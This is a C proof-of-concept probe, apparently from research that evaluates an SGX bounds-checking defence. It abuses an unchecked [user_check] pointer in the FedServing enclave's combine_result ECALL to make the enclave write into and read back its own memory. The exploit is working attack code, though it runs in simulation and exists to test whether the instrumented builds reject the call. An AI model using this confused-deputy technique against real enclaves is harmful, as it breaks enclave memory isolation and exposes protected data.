/* FedServing [user_check] confused-deputy probe (SDK SIM).
 *
 * The original EDL is:
 *   public int combine_result([user_check] ModelInput *input,
 *                             [user_check] CombinerOutput *output);
 * [user_check] passes the host-chosen raw pointer with no bridge copy, length,
 * null, canonical or range check.  BASELINE (stock Intel bridge, no ENCBound
 * instrumentation) therefore lets the host point input/output at enclave
 * memory.  RADIX_ONLY/MAC27 insert encbound_require at each access and should
 * reject the same call.
 *
 * This probe only uses the unchanged public ECALL.  It does not modify the
 * application, EDL or bridge.
 *
 *   write  one ECALL with output = base + WORKSPACE (inside the enclave)
 *   read   six ECALLs fill six 1280-byte prediction records at WORKSPACE, then
 *          one ECALL uses input = base + WORKSPACE and output = host memory.
 *
 * WORKSPACE is 0x3d000 for the retained images: in BASELINE it is mapped
 * enclave heap; in RADIX_ONLY/MAC27 it is .encbound.globalbss.
 * SIM-only read-back is used to verify the baseline write; the read side's
 * host output is checked against an independent oracle by the runner.
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "sgx_urts.h"
#include "Enclave_u.h"

#define WORKSPACE_OFFSET 0x3d000u

void ocall_print(const char *message) { fprintf(stderr, "%s\n", message); }

static void fill(ModelInput *in, int seed) {
    for (int i = 0; i < MODEL_NUM; ++i) {
        in[i].weight = -999;
        for (int j = 0; j < QUERY_SIZE; ++j)
            for (int k = 0; k < CATEGORY_NUM; ++k)
                in[i].preds[j][k] = 1.0 + i + 0.01*j + 0.001*k + 0.05*seed;
    }
}

static void put_matrix(FILE *f, const double m[QUERY_SIZE][CATEGORY_NUM]) {
    fputc('[', f);
    for (int j = 0; j < QUERY_SIZE; ++j)
        for (int k = 0; k < CATEGORY_NUM; ++k)
            fprintf(f, "%s%.17g", (j||k) ? "," : "", m[j][k]);
    fputc(']', f);
}

int main(int argc, char **argv) {
    if (argc != 5) {
        fprintf(stderr, "usage: %s <enclave.signed.so> <base-hex> <write|read> <out.json>\n",
                argv[0]);
        return 2;
    }
    uintptr_t base = strtoull(argv[2], NULL, 0);
    uintptr_t workspace = base + WORKSPACE_OFFSET;
    int do_read = !strcmp(argv[3], "read");
    const char *outpath = argv[4];

    sgx_enclave_id_t eid = 0;
    if (sgx_create_enclave(argv[1], SGX_DEBUG_FLAG, NULL, NULL, &eid, NULL))
        return 3;

    ModelInput *in = calloc(MODEL_NUM, sizeof(*in));
    if (!in) return 4;

    if (!do_read) {
        fill(in, 0);
        CombinerOutput *out = (CombinerOutput *)workspace;
        int ret = -1;
        fprintf(stderr, "probe: BASELINE has no check; host output=%p inside enclave %p\n",
                (void *)out, (void *)base);
        sgx_status_t st = combine_result(eid, &ret, in, out);
        printf("WRITE status=%#x ret=%d\n", st, ret);
        /* SIM-only verification of what the unchecked store wrote. */
        FILE *f = fopen(outpath, "w");
        if (!f) return 5;
        fprintf(f, "{\"seeds\":[0],\"write_back\":");
        put_matrix(f, ((CombinerOutput *)workspace)->preds);
        fprintf(f, "}\n");
        fclose(f);
        return 0;
    }

    /* Six confused-deputy writes fill six ModelInput.preds records. */
    for (int i = 0; i < MODEL_NUM; ++i) {
        fill(in, i);
        CombinerOutput *out = (CombinerOutput *)(workspace + i*sizeof(ModelInput));
        int ret = -1;
        sgx_status_t st = combine_result(eid, &ret, in, out);
        if (st || ret) {
            printf("FILL_FAIL i=%d status=%#x ret=%d\n", i, st, ret);
            return 6;
        }
        printf("FILL %d status=%#x ret=%d\n", i, st, ret);
    }

    /* Read the enclave-resident records as if they were the caller's ModelInput[]. */
    ModelInput *in2 = (ModelInput *)workspace;
    CombinerOutput *out2 = calloc(1, sizeof(*out2));
    if (!out2) return 4;
    int ret = -1;
    sgx_status_t st = combine_result(eid, &ret, in2, out2);
    printf("READ status=%#x ret=%d first=%.17g\n", st, ret, out2->preds[0][0]);

    FILE *f = fopen(outpath, "w");
    if (!f) return 5;
    fprintf(f, "{\"seeds\":[0,1,2,3,4,5],\"read_output\":");
    put_matrix(f, out2->preds);
    fprintf(f, "}\n");
    fclose(f);
    return 0;
}
